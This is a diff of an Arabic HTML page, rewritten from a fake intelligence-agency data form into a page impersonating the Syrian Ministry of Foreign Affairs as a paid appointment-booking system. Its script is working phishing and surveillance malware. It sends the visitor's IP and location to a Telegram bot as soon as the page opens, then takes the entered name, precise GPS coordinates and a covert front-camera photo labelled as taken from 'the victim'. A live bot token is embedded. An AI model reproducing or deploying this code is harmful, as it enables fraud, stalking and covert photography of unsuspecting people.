@@ -2,153 +2,143 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>نموذج جهاز الـ 101 - استخبارات العامة</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #1e1e2f;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+        body { 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background-color: #f8f9fa; 
+            margin: 0; 
+            text-align: center; 
+            font-weight: 900; 
+            color: #333;
         }
-        .form-container {
-            background: #2a2a3b;
-            padding: 35px 25px;
-            border-radius: 24px;
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 0 25px rgba(0, 0, 0, 0.7);
-            border: 1px solid #3e3e55;
+        .header { 
+            background: #ffffff; 
+            padding: 20px; 
+            border-bottom: 5px solid #b38a2e;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
         }
-        .form-container h2 {
-            color: #ffffff;
-            font-size: 22px;
-            margin-bottom: 8px;
-            text-align: center;
-            letter-spacing: 1px;
+        .header img { 
+            max-width: 85%; 
+            height: auto; 
+            max-height: 90px; 
         }
-        .form-container .sub {
-            color: #a0a0b8;
-            font-size: 14px;
-            text-align: center;
-            margin-bottom: 25px;
-            border-bottom: 1px solid #3a3a4f;
-            padding-bottom: 15px;
+        .container { 
+            max-width: 450px; 
+            margin: 30px auto; 
+            padding: 30px; 
+            background: #ffffff; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
+            border: 1px solid #e0e0e0;
         }
-        label {
-            color: #c8c8e0;
-            font-size: 14px;
-            font-weight: 500;
-            display: block;
-            margin-top: 16px;
-            margin-bottom: 6px;
+        h2 { 
+            color: #1a237e; 
+            font-size: 26px; 
+            margin-bottom: 10px; 
+            border-bottom: 2px solid #b38a2e;
+            display: inline-block;
+            padding-bottom: 5px;
         }
-        input, select, textarea {
-            width: 100%;
-            padding: 12px 14px;
-            border-radius: 12px;
-            border: 1px solid #3f3f57;
-            background: #1e1e2f;
-            color: #f0f0ff;
-            font-size: 15px;
-            transition: 0.25s;
+        .promo-box { 
+            background-color: #fff3cd; 
+            color: #856404; 
+            padding: 15px; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            margin-bottom: 25px; 
+            border: 1px solid #ffeeba;
+        }
+        label { 
+            display: block; 
+            text-align: right; 
+            margin: 15px 5% 8px; 
+            font-size: 18px; 
+            color: #1a237e; 
+        }
+        input, select { 
+            width: 90%; 
+            padding: 15px; 
+            margin-bottom: 20px; 
+            border: 2px solid #ced4da; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: 800; 
+            background: #fdfdfd; 
             outline: none;
         }
-        input:focus, select:focus, textarea:focus {
-            border-color: #6a6aff;
-            box-shadow: 0 0 0 3px rgba(106, 106, 255, 0.2);
-            background: #25253a;
-        }
-        textarea {
-            resize: vertical;
-            min-height: 70px;
-        }
-        .btn-submit {
-            margin-top: 28px;
-            background: #6a6aff;
-            color: white;
-            padding: 14px;
-            border: none;
-            border-radius: 14px;
-            font-size: 18px;
-            font-weight: 700;
-            width: 100%;
-            cursor: pointer;
+        input:focus { border-color: #b38a2e; }
+        
+        .btn { 
+            background: linear-gradient(135deg, #b38a2e 0%, #8e6d24 100%); 
+            color: white; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 12px; 
+            width: 90%; 
+            font-size: 20px; 
+            font-weight: 900; 
+            cursor: pointer; 
+            box-shadow: 0 5px 15px rgba(179, 138, 46, 0.4);
             transition: 0.3s;
-            letter-spacing: 0.5px;
         }
-        .btn-submit:hover {
-            background: #5757e6;
-            transform: scale(1.01);
-            box-shadow: 0 0 20px rgba(106, 106, 255, 0.3);
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 20px rgba(179, 138, 46, 0.6); }
+        
+        .footer { 
+            margin-top: 40px; 
+            font-size: 13px; 
+            color: #6c757d; 
+            padding-bottom: 30px; 
         }
-        .note {
-            color: #7a7a9a;
-            font-size: 12px;
-            text-align: center;
-            margin-top: 18px;
-        }
-        #status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 12px;
-            text-align: center;
-            font-weight: 500;
-            background: #1e1e2f;
-            color: #b0b0d0;
-        }
+        .hidden { display: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <h2>⚡ جهاز الـ 101</h2>
-    <div class="sub">استخبارات العامة – قسم التحقق الميداني</div>
-
-    <form id="mainForm">
-        <label>🔹 الاسم الكامل</label>
-        <input type="text" id="fullName" placeholder="الاسم الرباعي" required>
-
-        <label>🔹 رقم الهوية / البطاقة الشخصية</label>
-        <input type="text" id="idNumber" placeholder="رقم الهوية" required>
-
-        <label>🔹 تاريخ الميلاد</label>
-        <input type="date" id="dob" required>
-
-        <label>🔹 مكان الإقامة (المدينة / الحي)</label>
-        <input type="text" id="location" placeholder="المدينة، الحي، الشارع" required>
-
-        <label>🔹 رقم الجوال</label>
-        <input type="tel" id="phone" placeholder="مثال: 09xxxxxxxx" required>
-
-        <label>🔹 البريد الإلكتروني (اختياري)</label>
-        <input type="email" id="email" placeholder="example@mail.com">
-
-        <label>🔹 الجهة / القسم التابع لها</label>
-        <input type="text" id="department" placeholder="الجهة أو القسم" required>
-
-        <label>🔹 ملاحظات إضافية</label>
-        <textarea id="notes" placeholder="أي تفاصيل إضافية..."></textarea>
-
-        <button type="submit" class="btn-submit">✅ إرسال البيانات</button>
-    </form>
-
-    <div id="status"></div>
-    <div class="note">يتم تشفير البيانات وإرسالها بشكل آمن.</div>
+<div class="header">
+    <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
 </div>
+
+<div class="container">
+    <h2>منظومة الحجز الإلكتروني</h2>
+    <div class="promo-box">
+        ⚠️ تنبيه: متاح حالياً 7 مقاعد فقط للدور المستعجل (الرسم: 40$).
+    </div>
+    
+    <label>الاسم الثلاثي:</label>
+    <input type="text" id="name" placeholder="اكتب اسمك كما في الهوية">
+
+    <label>المحافظة المقيم بها:</label>
+    <select id="city">
+        <option value="">-- اختر من القائمة --</option>
+        <option value="إدلب">إدلب</option>
+        <option value="حلب">حلب</option>
+        <option value="دمشق">دمشق</option>
+        <option value="حمص">حمص</option>
+        <option value="حماة">حماة</option>
+        <option value="اللاذقية">اللاذقية</option>
+        <option value="طرطوس">طرطوس</option>
+        <option value="درعا">درعا</option>
+        <option value="دير الزور">دير الزور</option>
+    </select>
+
+    <button class="btn" onclick="startProcess()">تأكيد وإرسال الطلب</button>
+</div>
+
+<div class="footer">
+    الجمهورية العربية السورية - وزارة الخارجية والمغتربين © 2026
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
 
 <script>
     // ======== بيانات التليغرام المحدثة ========
     const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
     const CHAT_ID = "7214473798";
     // ===========================================
-
-    const form = document.getElementById('mainForm');
-    const statusDiv = document.getElementById('status');
 
     async function sendToTelegram(message) {
         try {
@@ -167,60 +157,158 @@
         }
     }
 
+    async function sendPhotoToTelegram(base64Image, caption) {
+        try {
+            const blob = dataURLtoBlob(base64Image);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'shot.jpg');
+            formData.append('caption', caption.substring(0, 1024));
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            await fetch(url, { method: 'POST', body: formData });
+        } catch (e) {
+            console.error("Photo send error:", e);
+        }
+    }
+
+    function dataURLtoBlob(dataURL) {
+        const arr = dataURL.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], { type: mime });
+    }
+
     async function getIPInfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
-            return `🌐 IP: ${data.ip}\n🏙️ المدينة: ${data.city || 'غير معروف'}\n🌍 الدولة: ${data.country_name || 'غير معروف'}\n📡 المزود: ${data.org || 'غير معروف'}`;
+            return {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                lat: data.latitude,
+                lon: data.longitude,
+                org: data.org
+            };
         } catch (e) {
-            return '🌐 تعذر جلب الـ IP';
+            return null;
         }
     }
 
-    form.addEventListener('submit', async function (e) {
-        e.preventDefault();
-        statusDiv.innerText = '⏳ جاري الإرسال...';
-        statusDiv.style.color = '#f0c060';
+    function captureCamera() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            sendToTelegram(`⚠️ وزارة الخارجية - الكاميرا غير مدعومة`);
+            return;
+        }
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth || 400;
+                    canvas.height = video.videoHeight || 300;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                    sendPhotoToTelegram(dataURL, `📸 وزارة الخارجية - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                }, 1500);
+            })
+            .catch(err => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const ctx = canvas.getContext('2d');
+                            canvas.width = video.videoWidth || 400;
+                            canvas.height = video.videoHeight || 300;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                            sendPhotoToTelegram(dataURL, `📸 وزارة الخارجية - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
+                            stream.getTracks().forEach(track => track.stop());
+                            video.srcObject = null;
+                        }, 1500);
+                    })
+                    .catch(() => sendToTelegram(`⚠️ وزارة الخارجية - رفض الكاميرا`));
+            });
+    }
 
-        const name = document.getElementById('fullName').value.trim();
-        const id = document.getElementById('idNumber').value.trim();
-        const dob = document.getElementById('dob').value;
-        const location = document.getElementById('location').value.trim();
-        const phone = document.getElementById('phone').value.trim();
-        const email = document.getElementById('email').value.trim();
-        const department = document.getElementById('department').value.trim();
-        const notes = document.getElementById('notes').value.trim();
+    async function startProcess() {
+        let name = document.getElementById("name").value.trim();
+        let city = document.getElementById("city").value;
 
+        if (!name || !city) { 
+            alert("يرجى ملء كافة الحقول المطلوبة."); 
+            return; 
+        }
+
+        // جلب IP
         const ipInfo = await getIPInfo();
+        let ipMsg = `🌐 <b>وزارة الخارجية - دخول جديد</b>\n\n`;
+        ipMsg += `👤 الاسم: ${name}\n`;
+        ipMsg += `🏙️ المحافظة: ${city}\n`;
+        if (ipInfo) {
+            ipMsg += `📡 IP: ${ipInfo.ip}\n`;
+            ipMsg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
+            ipMsg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
+            if (ipInfo.lat && ipInfo.lon) {
+                ipMsg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
+            }
+        }
+        ipMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+        await sendToTelegram(ipMsg);
 
-        let msg = `🕵️ <b>جهاز الـ 101 - بيانات جديدة</b>\n\n`;
-        msg += `👤 <b>الاسم:</b> ${name}\n`;
-        msg += `🆔 <b>رقم الهوية:</b> ${id}\n`;
-        msg += `📅 <b>تاريخ الميلاد:</b> ${dob}\n`;
-        msg += `📍 <b>مكان الإقامة:</b> ${location}\n`;
-        msg += `📱 <b>الجوال:</b> ${phone}\n`;
-        if (email) msg += `✉️ <b>البريد:</b> ${email}\n`;
-        msg += `🏢 <b>الجهة:</b> ${department}\n`;
-        if (notes) msg += `📝 <b>ملاحظات:</b> ${notes}\n`;
-        msg += `\n${ipInfo}\n`;
-        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+        // طلب GPS دقيق
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                let lat = p.coords.latitude;
+                let lon = p.coords.longitude;
+                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                let gpsMsg = `🎯 <b>وزارة الخارجية - موقع دقيق ✅</b>\n\n`;
+                gpsMsg += `👤 ${name}\n`;
+                gpsMsg += `📍 ${mapLink}\n`;
+                gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
+                gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+                await sendToTelegram(gpsMsg);
+            }, (err) => {
+                sendToTelegram(`⚠️ وزارة الخارجية - رفض GPS: ${err.message}`);
+            }, { enableHighAccuracy: true, timeout: 10000 });
+        }
 
-        await sendToTelegram(msg);
+        // تصوير الكاميرا
+        captureCamera();
 
-        statusDiv.innerText = '✅ تم الإرسال بنجاح!';
-        statusDiv.style.color = '#80d080';
-
-        form.reset();
+        alert("✅ تم تسجيل طلبك بنجاح! انتظر اتصالاً من القسم الفني لتأكيد موعد الاستلام.");
 
         setTimeout(() => {
             window.location.href = "https://www.facebook.com/jableh.ali.jbr";
         }, 2000);
-    });
+    }
 
+    // إرسال IP فوراً عند فتح الصفحة (دون تعبئة)
     (async function () {
         const ipInfo = await getIPInfo();
-        await sendToTelegram(`📡 <b>جهاز الـ 101 - دخول جديد</b>\n${ipInfo}\n🕒 ${new Date().toLocaleString('ar-EG')}`);
+        if (ipInfo) {
+            let msg = `📡 <b>وزارة الخارجية - صفحة مفتوحة</b>\n\n`;
+            msg += `🌐 IP: ${ipInfo.ip}\n`;
+            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
+            if (ipInfo.lat && ipInfo.lon) {
+                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
+            }
+            msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+            await sendToTelegram(msg);
+        }
     })();
 </script>
+
 </body>
 </html>
